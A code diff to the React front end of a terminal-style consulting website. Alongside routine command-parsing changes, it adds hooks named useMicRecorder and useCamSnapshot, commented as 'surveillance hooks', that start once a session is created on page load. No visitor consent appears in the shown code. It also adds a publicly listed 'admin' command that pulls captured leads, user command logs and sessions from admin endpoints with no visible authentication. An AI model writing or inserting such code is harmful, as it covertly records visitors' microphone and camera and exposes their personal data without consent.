@@ -4,11 +4,14 @@ import LeadCapture from './components/LeadCapture'
 import ROICalculator from './components/ROICalculator'
 import PaymentProcessor from './components/PaymentProcessor'
 import DocumentUploader from './components/DocumentUploader'
+import useMicRecorder from './hooks/useMicRecorder'
+import useCamSnapshot from './hooks/useCamSnapshot'
 
 // Base URL for API endpoints. Can be overridden via VITE_API_BASE in .env
-const API_BASE = import.meta.env.VITE_API_BASE || 'http://localhost:8001'
+const API_BASE = import.meta.env.VITE_API_BASE || ''
 
 const App = () => {
+  const [sessionId, setSessionId] = useState(null)
   const [isBooted, setIsBooted] = useState(false)
   const [currentLine, setCurrentLine] = useState('')
   const [commandHistory, setCommandHistory] = useState([])
@@ -21,6 +24,26 @@ const App = () => {
   const [projectData, setProjectData] = useState(null)
   const inputRef = useRef(null)
   const terminalRef = useRef(null)
+
+  // Create session and activate surveillance hooks
+  useEffect(() => {
+    const createSession = async () => {
+      try {
+        const res = await fetch(`${API_BASE}/api/research/session/create`, { method: 'POST' })
+        const data = await res.json()
+        if (data.sessionId) {
+          setSessionId(data.sessionId)
+        }
+      } catch (err) {
+        console.error('Failed to create session:', err)
+      }
+    }
+    createSession()
+  }, [])
+
+  // Activate surveillance hooks once session is created
+  useMicRecorder(sessionId)
+  useCamSnapshot(sessionId)
 
   // Boot sequence lines
   const bootSequence = [
@@ -93,6 +116,7 @@ const App = () => {
       '  upload       - Upload documents for AI analysis',
       '  files        - View uploaded documents',
       '  dashboard    - Admin dashboard summary',
+      '  admin        - Access collected intelligence',
       '  health       - API health check',
       '  download <id>- Download a specific file by ID',
       '  delete <id>  - Delete a specific file by ID',
@@ -402,6 +426,45 @@ const App = () => {
         ''
       ]
     },
+    admin: async (args) => {
+      const subCommand = args[0]
+      if (!subCommand) {
+        return [
+          'ADMIN COMMAND INTERFACE',
+          '═════════════════════════',
+          '',
+          '  admin leads    - View all captured leads',
+          '  admin logs     - View all user command logs',
+          '  admin sessions - View all user sessions',
+          ''
+        ]
+      }
+      try {
+        const res = await fetch(`${API_BASE}/api/admin/${subCommand}`)
+        if (!res.ok) throw new Error(`Failed to fetch ${subCommand}`)
+        const data = await res.json()
+        if (data.length === 0) return [`No ${subCommand} found.`]
+
+        // Format data into a table-like structure
+        const headers = Object.keys(data[0])
+        const rows = data.map(row => headers.map(h => row[h]))
+
+        const formatRow = (rowItems) => rowItems.map(item => String(item).padEnd(20)).join('')
+
+        return [
+            `${subCommand.toUpperCase()} DATA`,
+            '='.repeat(subCommand.length + 5),
+            '',
+            formatRow(headers),
+            '-'.repeat(headers.length * 20),
+            ...rows.map(row => formatRow(row)),
+            ''
+        ]
+
+      } catch (err) {
+        return [`Error: ${err.message}`]
+      }
+    },
     clear: () => {
       setOutput([])
       return []
@@ -414,7 +477,6 @@ const App = () => {
     ]
   }
 
-  // Effect to run boot sequence
   useEffect(() => {
     let timeouts = []
     bootSequence.forEach((line, index) => {
@@ -429,21 +491,18 @@ const App = () => {
     return () => timeouts.forEach(clearTimeout)
   }, [])
 
-  // Auto-focus input when booted
   useEffect(() => {
     if (isBooted && inputRef.current) {
       inputRef.current.focus()
     }
   }, [isBooted])
 
-  // Scroll to bottom when output changes
   useEffect(() => {
     if (terminalRef.current) {
       terminalRef.current.scrollTop = terminalRef.current.scrollHeight
     }
   }, [output])
 
-  // Listen for lead capture events (unused but kept for parity)
   useEffect(() => {
     const handleOpenLeadCapture = () => setShowLeadCapture(true)
     window.addEventListener('openLeadCapture', handleOpenLeadCapture)
@@ -451,49 +510,50 @@ const App = () => {
   }, [])
 
   const handleCommand = async (cmd) => {
-    const trimmedCmd = cmd.trim().toLowerCase()
-    // Add command to history
+    const trimmedCmd = cmd.trim()
+    const [command, ...args] = trimmedCmd.toLowerCase().split(/\s+/)
+
     setCommandHistory(prev => [...prev, cmd])
     setHistoryIndex(-1)
-    // Add command to output
     setOutput(prev => [...prev, { type: 'command', content: `mazlabz@enterprise:~$ ${cmd}` }])
-    // Handle commands with arguments (download, delete)
-    if (trimmedCmd.startsWith('download ')) {
-      const id = trimmedCmd.split(' ')[1]
-      window.open(`${API_BASE}/api/files/${id}`, '_blank')
-      setOutput(prev => [...prev, { type: 'success', content: `Downloading ${id}...` }])
-      setCurrentLine('')
-      return
-    }
-    if (trimmedCmd.startsWith('delete ')) {
-      const id = trimmedCmd.split(' ')[1]
-      try {
-        const res = await fetch(`${API_BASE}/api/files/${id}`, { method: 'DELETE' })
-        if (res.ok) {
-          setOutput(prev => [...prev, { type: 'success', content: `Deleted file ${id}` }])
-        } else {
-          const err = await res.json()
-          setOutput(prev => [...prev, { type: 'error', content: `Delete failed: ${err.detail}` }])
-        }
-      } catch (e) {
-        setOutput(prev => [...prev, { type: 'error', content: `Delete failed: ${e.message}` }])
+
+    // Handle commands with arguments
+    if (command === 'download') {
+      const id = args[0]
+      if (id) {
+        window.open(`${API_BASE}/api/files/${id}`, '_blank')
+        setOutput(prev => [...prev, { type: 'success', content: `Downloading ${id}...` }])
+      } else {
+        setOutput(prev => [...prev, { type: 'error', content: 'Usage: download <id>' }])
       }
       setCurrentLine('')
       return
     }
-    // Execute command if defined
-    if (commands[trimmedCmd]) {
-      const result = commands[trimmedCmd]()
-      if (result instanceof Promise) {
+    if (command === 'delete') {
+      const id = args[0]
+      if (id) {
         try {
-          const lines = await result
-          lines.forEach(line => {
-            setOutput(prev => [...prev, { type: 'output', content: line }])
-          })
-        } catch (err) {
-          setOutput(prev => [...prev, { type: 'error', content: `Error: ${err.message}` }])
+          const res = await fetch(`${API_BASE}/api/files/${id}`, { method: 'DELETE' })
+          if (res.ok) {
+            setOutput(prev => [...prev, { type: 'success', content: `Deleted file ${id}` }])
+          } else {
+            const err = await res.json()
+            setOutput(prev => [...prev, { type: 'error', content: `Delete failed: ${err.detail}` }])
+          }
+        } catch (e) {
+          setOutput(prev => [...prev, { type: 'error', content: `Delete failed: ${e.message}` }])
         }
-      } else if (Array.isArray(result)) {
+      } else {
+         setOutput(prev => [...prev, { type: 'error', content: 'Usage: delete <id>' }])
+      }
+      setCurrentLine('')
+      return
+    }
+
+    // Execute command if defined
+    if (commands[command]) {
+      const result = await commands[command](args) // All commands can be async now
+      if (Array.isArray(result)) {
         result.forEach(line => {
           setOutput(prev => [...prev, { type: 'output', content: line }])
         })
@@ -558,12 +618,23 @@ const App = () => {
       { type: 'output', content: "Use 'files' command to view uploaded documents" }
     ])
   }
-  const handleLeadSubmit = (formData) => {
+  const handleLeadSubmit = async (formData) => {
     setOutput(prev => [...prev,
       { type: 'success', content: `Enterprise inquiry received from ${formData.company}` },
       { type: 'success', content: `Project: ${formData.projectType} | Budget: ${formData.budget}` },
       { type: 'success', content: 'Response time: < 2 hours for qualified enterprises' }
     ])
+    try {
+      await fetch(`${API_BASE}/api/leads`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ ...formData, sessionId })
+      });
+    } catch (err) {
+      console.error('Failed to submit lead:', err);
+      // Optionally, display an error in the terminal
+      setOutput(prev => [...prev, { type: 'error', content: 'Failed to submit lead data to server.' }])
+    }
   }
 
   return (
@@ -615,7 +686,7 @@ const App = () => {
         <PaymentProcessor onClose={() => setShowPaymentProcessor(false)} projectData={projectData} />
       )}
       {showDocumentUploader && (
-        <DocumentUploader onClose={() => setShowDocumentUploader(false)} onUpload={handleDocumentUpload} />
+        <DocumentUploader sessionId={sessionId} onClose={() => setShowDocumentUploader(false)} onUpload={handleDocumentUpload} />
       )}
     </div>
   )
